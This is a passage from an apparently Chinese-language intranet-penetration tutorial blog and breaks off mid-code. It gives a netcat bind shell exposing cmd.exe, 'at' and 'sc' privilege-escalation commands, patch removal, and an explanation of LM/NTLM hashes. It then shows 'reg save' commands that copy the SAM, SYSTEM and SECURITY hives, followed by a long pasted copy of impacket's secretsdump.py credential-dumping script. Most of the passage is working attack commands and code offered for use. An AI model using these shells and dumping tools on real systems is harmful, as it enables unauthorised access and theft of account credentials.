class="literal">-p</span> <span class="number">8888</span> <span class="literal">-e</span> cmd.exe <span class="literal">-v</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/51.png" alt="image-20200801155337817"></p><p>kali上运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc  192.168.183.145 8888 -vv</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/52.png" alt="image-20200801155352064"></p><p>这样我们就能直接执行命令了</p><h4 id="mssql"><a href="#mssql" class="headerlink" title="mssql"></a>mssql</h4><p>当目标机器只开放mssql时，我们也可以利用mssql执行clr作为传输通道。</p><p>项目地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;blackarrowsec&#x2F;mssqlproxy</span><br></pre></td></tr></table></figure><p>需要环境如下</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/53.png" alt="img"></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>首先在Windows中，权限分为四类</p><table><thead><tr><th align="center"><strong>权限</strong></th><th align="center"><strong>详细</strong></th></tr></thead><tbody><tr><td align="center">User</td><td align="center">普通用户权限</td></tr><tr><td align="center">Administrator</td><td align="center">管理员权限。通常需要通过机制再提升为system权限来操作SAM（Mimikatz抓密码）</td></tr><tr><td align="center">System</td><td align="center">系统权限。可以操作SAM，需要从Administrator提升到SAM才能对散列值Dump</td></tr><tr><td align="center">TrustedInstaller</td><td align="center">最高权限，可以操作系统文件</td></tr></tbody></table><p>利用kb编号查询相关CVE网站</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;bugs.hacking8.com&#x2F;tiquan&#x2F;</span><br></pre></td></tr></table></figure><p>利用MSF查询可利用提权漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post&#x2F;windows&#x2F;gather&#x2F;enum_patches</span><br></pre></td></tr></table></figure><p>还可以卸载kb补丁</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wusa /uninstall /kb:XXXXXXX</span><br></pre></td></tr></table></figure><h3 id="Administrator提权到SYSTEM"><a href="#Administrator提权到SYSTEM" class="headerlink" title="Administrator提权到SYSTEM"></a>Administrator提权到SYSTEM</h3><h4 id="at本地命令提权"><a href="#at本地命令提权" class="headerlink" title="at本地命令提权"></a>at本地命令提权</h4><p>适用于Windows2000、Windows 2003、Windows XP这三个系统</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#at 时间 命令</span><br><span class="line">at 20:45 calc.exe</span><br><span class="line">#开启交互式的cmd</span><br><span class="line">at 20:45 &#x2F;interactive cmd.exe</span><br></pre></td></tr></table></figure><h4 id="sc命令提权"><a href="#sc命令提权" class="headerlink" title="sc命令提权"></a>sc命令提权</h4><p>适用于Windows 7、Windows 8、Windows Server 03、Windows Server  08、Windows Server  12、Windows Server 16</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc Create syscmd binPath&#x3D; &quot;cmd &#x2F;K start&quot; type&#x3D; own type&#x3D; interact</span><br></pre></td></tr></table></figure><h3 id="CVE漏洞提权"><a href="#CVE漏洞提权" class="headerlink" title="CVE漏洞提权"></a>CVE漏洞提权</h3><p>单独写一篇文章主要是内容太多了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.ascotbe.com&#x2F;2020&#x2F;08&#x2F;10&#x2F;WindowsKernelExploits&#x2F;</span><br></pre></td></tr></table></figure><h2 id="获取密码"><a href="#获取密码" class="headerlink" title="获取密码"></a>获取密码</h2><p>密码抓取已经成为渗透中必不可少的一项技能。一个管理员很可能管理着N多台机器，但是密码使用的都是同一个或者是有规律的。如果抓到一台机器的密码，利用同密码碰撞，很可能这个渗透项目就结束了。</p><h3 id="密码组成"><a href="#密码组成" class="headerlink" title="密码组成"></a>密码组成</h3><p>我们经常看到的hash长这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure><p>他的组成就是:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user:sid:lmhash:ntlmhash</span><br></pre></td></tr></table></figure><p>lmhash的加密流程如下：</p><p>1、密码长度限制为14个字符</p><p>2、密码全部转换为大写</p><p>3、密码转换为16进制字符串，不足14字节用0补全</p><p>4、密码的16进制字符串被分成两个7byte部分</p><p>5、再分7bit为一组,每组末尾加0，再组成一组</p><p>6、上步骤得到的二组，分别作为key 为 <code>KGS!@#$%</code>进行DES加密。</p><p>7、将加密后的两组拼接在一起，得到最终LM HASH值。</p><p>为了解决LM加密和身份验证方案固有的安全漏洞，Microsoft 于1993年在Windows NT 3.1中引入了NTLMv1协议(ntlmhash)。对于散列，NTLM使用Unicode支持，替换为，不需要任何填充或截断操作即可简化密钥。</p><p>1、先将用户密码转换为十六进制格式。</p><p>2、将十六进制格式的密码进行Unicode编码。</p><p>3、使用MD4对Unicode编码数据进行Hash计算</p><p>因为在vista后不再支持lmhash，因此抓到的hash中的lmhash都是<code>aad3b435b51404eeaad3b435b51404ee</code></p><p>在hash传递攻击时，可以替换成0：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00000000000000000000000000000000</span><br></pre></td></tr></table></figure><p>再看下ntlm认证的过程</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/54.png" alt="img"></p><p>他的简述流程如下：</p><p>1、客户端向服务端发起认证</p><p>2、服务器收到请求后，生成一个16位的随机数(这个随机数被称为Challenge),明文发送回客户端。并使用登录用户密码hash加密Challenge，获得Challenge1</p><p>3、客户端接收到Challenge后，使用登录用户的密码hash对Challenge加密，获得Challenge2(这个结果被称为response)，将response发送给服务器</p><p>4、服务器接收客户端加密后的response，比较Challenge1和response，如果相同，验证成功。</p><p>上述中的response类似于下面这样：</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/55.png" alt="img"></p><p>上述中的response就可以理解为net-ntlmhash，因此ntlmhash我们是可以拿来hash传递的，而net-ntlmhash不可以，但是net-ntlmhash也可以拿来做破解和relay。</p><h3 id="本地提取"><a href="#本地提取" class="headerlink" title="本地提取"></a>本地提取</h3><p>在windows上的<strong>C:\Windows\System32\config</strong>目录保存着当前用户的密码hash。我们可以使用相关手段获取该hash。</p><p><strong>提取的时候需要管理员权限，普通权限没办法提取出来</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用reg命令获取本地用户凭据hash</span></span><br><span class="line">reg  save  hklm\sam sam.hive</span><br><span class="line">reg  save hklm\system system.hive</span><br><span class="line">reg  save hklm\security security.hive</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/56.png" alt="image-20200803150511319"></p><p>然后用下面这个项目解密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;SecureAuthCorp&#x2F;impacket&#x2F;blob&#x2F;master&#x2F;examples&#x2F;secretsdump.py</span><br></pre></td></tr></table></figure><p>防止丢失我就把代码拷贝过来了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> division</span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> impacket <span class="keyword">import</span> version</span><br><span class="line"><span class="keyword">from</span> impacket.examples <span class="keyword">import</span> logger</span><br><span class="line"><span class="keyword">from</span> impacket.smbconnection <span class="keyword">import</span> SMBConnection</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> impacket.examples.secretsdump <span class="keyword">import</span> LocalOperations, RemoteOperations, SAMHashes, LSASecrets, NTDSHashes</span><br><span class="line"><span class="keyword">from</span> impacket.krb5.keytab <span class="keyword">import</span> Keytab</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">input</span> = raw_input</span><br><span class="line"><span class="keyword">except</span> NameError:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DumpSecrets</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, remoteName, username=<span class="string">&#x27;&#x27;</span>, password=<span class="string">&#x27;&#x27;</span>, domain=<span class="string">&#x27;&#x27;</span>, options=<span class="literal">None</span></span>):</span></span><br><span class="line">        self.__useVSSMethod = options.use_vss</span><br><span class="line">        self.__remoteName = remoteName</span><br><span class="line">        self.__remoteHost = options.target_ip</span><br><span class="line">        self.__username = username</span><br><span class="line">        self.__password = password</span><br><span class="line">        self.__domain = domain</span><br><span class="line">        self.__lmhash = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        self.__nthash = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        self.__aesKey = options.aesKey</span><br><span class="line">        self.__smbConnection = <span class="literal">None</span></span><br><span class="line">        self.__remoteOps = <span class="literal">None</span></span><br><span class="line">        self.__SAMHashes = <span class="literal">None</span></span><br><span class="line">        self.__NTDSHashes = <span class="literal">None</span></span><br><span class="line">        self.__LSASecrets = <span class="literal">None</span></span><br><span class="line">        self.__systemHive = options.system</span><br><span class="line">        self.__bootkey = options.bootkey</span><br><span class="line">        self.__securityHive = options.security</span><br><span class="line">        self.__samHive = options.sam</span><br><span class="line">        self.__ntdsFile = options.ntds</span><br><span class="line">        self.__history = options.history</span><br><span class="line">        self.__noLMHash = <span class="literal">True</span></span><br><span class="line">        self.__isRemote = <span class="literal">True</span></span><br><span class="line">        self.__outputFileName = options.outputfile</span><br><span class="line">        self.__doKerberos = options.k</span><br><span class="line">        self.__justDC = options.just_dc</span><br><span class="line">        self.__justDCNTLM = options.just_dc_ntlm</span><br><span class="line">        self.__justUser = options.just_dc_user</span><br><span class="line">        self.__pwdLastSet = options.pwd_last_set</span><br><span class="line">        self.__printUserStatus= options.user_status</span><br><span class="line">        self.__resumeFileName = options.resumefile</span><br><span class="line">        self.__canProcessSAMLSA = <span class="literal">True</span></span><br><span class="line">        self.__kdcHost = options.dc_ip</span><br><span class="line">        self.__options = options</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> options.hashes <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            self.__lmhash, self.__nthash = options.hashes.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">connect</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.__smbConnection = SMBConnection(self.__remoteName, self.__remoteHost)</span><br><span class="line">        <span class="keyword">if</span> self.__doKerberos:</span><br><span class="line">            self.__smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,</span><br><span class="line">                                               self.__nthash, self.__aesKey, self.__kdcHost)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.__smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dump</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> self.__remoteName.upper() == <span class="string">&#x27;LOCAL&#x27;</span> <span class="keyword">and</span> self.__username == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">                self.__isRemote = <span class="literal">False</span></span><br><span class="line">                self.__useVSSMethod = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">if</span> self.__systemHive:</span><br><span class="line">                    localOperations = LocalOperations(self.__systemHive)</span><br><span class="line">                    bootKey = localOperations.getBootKey()</span><br><span class="line">                    <span class="keyword">if</span> self.__ntdsFile <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                    <span class="comment"># Let&#x27;s grab target&#x27;s configuration about LM Hashes storage</span></span><br><span class="line">                        self.__noLMHash = localOperations.checkNoLMHashPolicy()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">import</span> binascii</span><br><span class="line">                    bootKey = binascii.unhexlify(self.__bootkey)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.__isRemote = <span class="literal">True</span></span><br><span class="line">                bootKey = <span class="literal">None</span></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        self.connect()</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="keyword">if</span> os.getenv(<span class="string">&#x27;KRB5CCNAME&#x27;</span>) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> self.__doKerberos <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">                            <span class="comment"># SMBConnection failed. That might be because there was no way to log into the</span></span><br><span class="line">                            <span class="comment"># target system. We just have a last resort. Hope we have tickets cached and that they</span></span><br><span class="line">                            <span class="comment"># will work</span></span><br><span class="line">                            logging.debug(<span class="string">&#x27;SMBConnection didn\&#x27;t work, hoping Kerberos will help (%s)&#x27;</span> % <span class="built_in">str</span>(e))</span><br><span class="line">                            <span class="keyword">pass</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line">                    self.__remoteOps  = RemoteOperations(self.__smbConnection, self.__doKerberos, self.__kdcHost)</span><br><span class="line">                    self.__remoteOps.setExecMethod(self.__options.exec_method)</span><br><span class="line">                    <span class="keyword">if</span> self.__justDC <span class="keyword">is</span> <span class="literal">False</span> <span class="keyword">and</span> self.__justDCNTLM <span class="keyword">is</span> <span class="literal">False</span> <span class="keyword">or</span> self.__useVSSMethod <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">                        self.__remoteOps.enableRegistry()</span><br><span class="line">                        bootKey             = self.__remoteOps.getBootKey()</span><br><span class="line">                        <span class="comment"># Let&#x27;s check whether target system stores LM Hashes</span></span><br><span class="line">                        self.__noLMHash = self.__remoteOps.checkNoLMHashPolicy()</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    self.__canProcessSAMLSA = <span class="literal">False</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">str</span>(e).find(<span class="string">&#x27;STATUS_USER_SESSION_DELETED&#x27;</span>) <span class="keyword">and</span> os.getenv(<span class="string">&#x27;KRB5CCNAME&#x27;</span>) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> \</span><br><span class="line">                        <span class="keyword">and</span> self.__doKerberos <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">                        <span class="comment"># Giving some hints here when SPN target name validation is set to something different to Off</span></span><br><span class="line">                        <span class="comment"># This will prevent establishing SMB connections using TGS for SPNs different to cifs/</span></span><br><span class="line">                        logging.error(<span class="string">&#x27;Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user&#x27;</span>)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        logging.error(<span class="string">&#x27;RemoteOperations failed: %s&#x27;</span> % <span class="built_in">str</span>(e))</span><br><span class="line"></span><br><span class="line">            <span class="comment"># If RemoteOperations succeeded, then we can extract SAM and LSA</span></span><br><span class="line">            <span class="keyword">if</span> self.__justDC <span class="keyword">is</span> <span class="literal">False</span> <span class="keyword">and</span> self.__justDCNTLM <span class="keyword">is</span> <span class="literal">False</span> <span class="keyword">and</span> self.__canProcessSAMLSA:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">if</span> self.__isRemote <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">                        SAMFileName         = self.__remoteOps.saveSAM()</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        SAMFileName         = self.__samHive</span><br><span class="line"></span><br><span class="line">                    self.__SAMHashes    = SAMHashes(SAMFileName, bootKey, isRemote = self.__isRemote)</span><br><span class="line">                    self.__SAMHashes.dump()</span><br><span class="line">                    <span class="keyword">if</span> self.__outputFileName <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                        self.__SAMHashes.export(self.__outputFileName)</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    logging.error(<span class="string">&#x27;SAM hashes extraction failed: %s&#x27;</span> % <span class="built_in">str</span>(e))</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">if</span> self.__isRemote <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">                        SECURITYFileName = self.__remoteOps.saveSECURITY()</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        SECURITYFileName = self.__securityHive</span><br><span class="line"></span><br><span class="line">                    self.__LSASecrets = LSASecrets(SECURITYFileName, bootKey, self.__remoteOps,</span><br><span class="line">                                                   isRemote=self.__isRemote, history=self.__history)</span><br><span class="line">                    self.__LSASecrets.dumpCachedHashes()</span><br><span class="line">                    <span class="keyword">if</span> self.__outputFileName <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                        self.__LSASecrets.exportCached(self.__outputFileName)</span><br><span class="line">                    self.__LSASecrets.dumpSecrets()</span><br><span class="line">                    <span class="keyword">if</span> self.__outputFileName <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                        self.__LSASecrets.exportSecrets(self.__outputFileName)</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    <span class="keyword">if</span> logging.getLogger().level == logging.DEBUG:</span><br><span class="line">                        <span class="keyword">import</span> traceback</span><br><span class="line">                        traceback.print_exc()</span><br><span class="line">                    logging.error(<span class="string">&#x27;LSA hashes extraction failed: %s&#x27;</span> % <span class="built_in">str</span>(e))</span><br><span class="line"></span><br><span class="line">            <span class="comment"># NTDS Extraction we can try regardless of RemoteOperations failing. It might still work</span></span><br><span class="line">            <span class="keyword">if</span> self.__isRemote <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="keyword">if</span> self.__useVSSMethod <span class="keyword">and</span> self.__remoteOps <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                    NTDSFileName = self.__remoteOps.saveNTDS()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    NTDSFileName = <span class="literal">None</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                NTDSFileName = self.__ntdsFile</span><br><span class="line"></span><br><span class="line">            self.__NTDSHashes = NTDSHashes(NTDSFileName, bootKey, isRemote=self.__isRemote, history=self.__history,</span><br><span class="line">                                           noLMHash=self.__noLMHash, remoteOps=self.__remoteOps,</span><br><span class="line">                                           useVSSMethod=self.__useVSSMethod, justNTLM=self.__justDCNTLM,</span><br><span class="line">                                           pwdLastSet=self.__pwdLastSet, resumeSession=self.__resumeFileName,</span><br><span class="line">                                           outputFileName=self.__outputFileName, justUser=self.__justUser,</span><br><span class="line">                                           printUserStatus= self.__printUserStatus)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                self.__NTDSHashes.dump()</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">if</span> logging.getLogger().level == logging.DEBUG:</span><br><span class="line">                    <span class="keyword">import</span> traceback</span><br><span class="line">                    traceback.print_exc()</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">str</span>(e).find(<span class="string">&#x27;ERROR_DS_DRA_BAD_DN&#x27;</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">                    <span class="comment"># We don&#x27;t store the resume file if this error happened, since this error is related to lack</span></span><br><span class="line">                    <span class="comment"># of enough privileges to access DRSUAPI.</span></span><br><span class="line">                    resumeFile = self.__NTDSHashes.getResumeSessionFile()</span><br><span class="line">                    <span class="keyword">if</span> resumeFile <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                        os.unlink(resumeFile)</span><br><span class="line">                logging.error(e)</span><br><span class="line">                <span class="keyword">if</span> self.__justUser <span class="keyword">and</span> <span class="built_in">str</span>(e).find(<span 